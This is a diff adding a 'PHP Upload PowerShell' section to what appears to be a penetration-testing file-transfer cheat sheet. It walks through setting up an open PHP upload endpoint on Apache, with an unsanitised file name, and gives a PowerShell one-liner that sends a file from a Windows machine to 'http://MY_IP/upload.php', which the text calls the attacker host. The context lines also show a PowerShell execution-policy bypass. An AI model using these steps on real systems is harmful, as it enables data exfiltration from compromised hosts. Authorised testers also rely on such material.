@@ -329,6 +329,44 @@ Finally, we can call and run the ps file using below:
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 ```
 
+### PHP Upload PowerShell
+
+Create this PHP file:
+
+```php
+<?php
+$uploaddir = '/var/www/uploads/';
+$uploadfile = $uploaddir . $_FILES['file']['name'];
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+?>
+```
+
+Start the apache2 service:
+
+```bash
+sudo systemctl start apache2
+```
+
+**Make the directory and change ownership of www-data (this will allow anyone to upload files to the machine):**
+
+```bash
+sudo mkdir /var/www/uploads
+ps -ef | grep apache
+sudo chown www-data: /var/www/uploads
+```
+
+Move the php file to the web root directory:
+
+```bash
+sudo mv upload.php /var/www/ && sudo chown www-data:www-data /var/www/upload.php
+```
+
+In Windows use PowerShell to upload the file to the attacker host / the web server:
+
+```powershell
+powershell (New-Object System.Net.WebClient).UploadFile('http://MY_IP/upload.php', 'filename.txt')
+```
+
 ### Alternative VBScript
 
 **VBScript(XP, 2003)**
